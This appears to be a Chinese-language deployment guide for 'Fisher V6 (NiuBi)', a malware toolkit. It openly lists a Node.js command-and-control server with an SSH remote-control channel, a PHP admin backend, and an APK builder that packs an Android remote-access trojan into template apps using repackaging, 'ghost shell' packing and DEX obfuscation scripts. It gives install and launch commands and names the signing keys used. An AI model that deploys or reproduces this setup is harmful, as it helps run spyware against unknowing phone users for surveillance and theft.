# Fisher V6 (NiuBi) 部署说明

## 架构
- **Node.js C2 服务端**: server.js → server_remote.js (398KB 主逻辑)
- **PHP API**: PHP-API-完整/ (NiuBi 后台)
- **APK Builder**: apk-builder/ (Android RAT 打包)

## 服务端部署

### 环境要求
- Node.js 20.x
- PM2 (进程管理)
- SQLite3 (内嵌数据库 fisher.db)

### 安装步骤
```bash
cd Fisher-Node-Server/
npm install
# 或
cd C2服务端-NodeJS/
npm install
```

### 启动
```bash
# PM2 启动 (生产)
pm2 start server.js --name fisher-node

# 直接启动 (开发)
node server.js
```

### 关键依赖 (package.json)
- express: HTTP服务
- better-sqlite3: SQLite3数据库
- ssh2: SSH远控通道
- jsonwebtoken: JWT认证
- bcryptjs: 密码加密
- speakeasy: 2FA/TOTP
- geoip-lite: IP地理定位
- qrcode: 二维码生成
- multer: 文件上传
- compression: 响应压缩

## APK Builder 部署

### 环境要求
- Python 3.x
- Java (for apktool/apksigner/baksmali)

### 工具列表
- `build_apk.py` / `build_apk_v2.py`: APK构建主脚本
- `apk_repacker.py`: APK重打包
- `ghost_packer.py`: 幽灵壳打包
- `dex_protect.py`: DEX保护/混淆
- `customize_shell*.py`: 壳定制
- `modify_apk.py`: APK修改

### 模板APK
- `ghost_template.apk` (34MB): 幽灵壳模板
- `kiss_template.apk` (51MB): Kiss模板
- `source.apk` (27MB): 源APK
- `パルス.apk` (57MB): 脉冲模板

### 签名密钥
- `_aosp_testkey.p12`: AOSP测试签名
- `_debug.keystore`: 调试签名

## PHP API 部署
参见 PHP-API-完整/ 目录，需要:
- PHP 7.4+ / 8.x
- MySQL 5.7+
- Nginx/Apache
- Composer

## 数据库
- `fisher.db`: SQLite3，C2服务端内嵌
- `niubi.sql`: MySQL，PHP API后台
